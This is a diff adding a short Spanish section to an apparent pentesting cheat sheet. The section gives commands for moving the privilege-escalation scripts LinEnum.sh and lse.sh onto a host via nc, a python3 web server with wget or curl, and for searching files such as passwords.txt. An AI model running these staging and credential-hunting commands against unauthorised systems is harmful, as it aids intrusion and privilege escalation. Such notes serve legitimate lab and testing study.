@@ -100,6 +100,41 @@
    ssh -oHostKeyAlgorithms=+ssh-rsa user@<TARGET_IP>
    ```
 
+# Linux: Comandos mas usados
+
+1. Para trasnferir archivos usando nc
+
+   Ejecutar en el host donde va a pasar los archivos
+   ```bash
+   nc -l -p 1234 > LinEnum.sh 
+   ```
+   Ejecutar host donde estan los archvios
+   ```bash
+   cat /home/user/tools/privesc-scripts/LinEnum.sh | nc 10.9.2.251 1234
+   ```
+
+2. Para trasnferir archivos usando python3 y wget o curl
+
+   Ejetuar en donde estan los archivos
+   ```bash
+   python3 -m http.server 8080 
+   ```
+   Ejecutar en donde descargar los archivos
+   ```bash
+   wget http://10.9.2.251:8080/lse.sh -O /home/sn0w/lse.sh 
+   ```
+   ```bash
+   curl -o /home/sn0w/lse.sh http://10.9.2.251:8080/lse.sh 
+   ```
+3. Encontrar archivos
+
+   ```bash
+   find -name passwords.txt 
+   ```
+   ```bash
+   find -name *.txt 
+   ```
+   
 
 # Sitios Web
 
